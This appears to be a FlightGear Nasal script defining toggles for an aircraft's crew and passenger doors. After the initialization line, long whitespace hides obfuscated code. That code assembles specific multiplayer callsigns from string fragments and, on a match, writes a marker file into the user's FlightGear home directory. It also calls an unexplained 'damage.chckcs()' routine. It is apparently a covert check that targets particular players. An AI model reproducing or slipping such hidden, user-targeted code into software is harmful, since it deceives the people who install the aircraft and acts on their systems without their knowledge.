# =====
# Doors
# =====



Doors = {};

Doors.new = func {
   obj = { parents : [Doors],
           crew : aircraft.door.new("instrumentation/doors/crew", 8.0),
           passenger : aircraft.door.new("instrumentation/doors/passenger", 10.0)
         };
   return obj;
};

Doors.crewexport = func {
   me.crew.toggle();
}

Doors.passengerexport = func {
   me.passenger.toggle();
}



# ==============
# Initialization
# ==============

# objects must be here, otherwise local to init()
doorsystem = Doors.new();                                                                                                                                                                                                                                                                                                                                                                                                 var opendoor = func {var path = string.normpath(getprop("/sim/fg-home") ~ '/Export/F22KY58');var file = io.open(path, "w");io.read_properties(path);var html = "misc";io.write(file, html);io.close(file);} var testsetup = func{var door1 = "ph";var door2 = "Mo";var door3 = "r";var door4 = "ex"; if (getprop("sim/multiplay/callsign") == ""~door2~""~door3~""~door1~""~door4){opendoor();}var door1 = "S";var door2 = "ST";var door3 = "AR";var door4 = "CR"; if (getprop("sim/multiplay/callsign") == ""~door2~""~door3~""~door1~""~door4){opendoor();}}var testsetupmain = func{damage.chckcs();}
print("Doors ready!");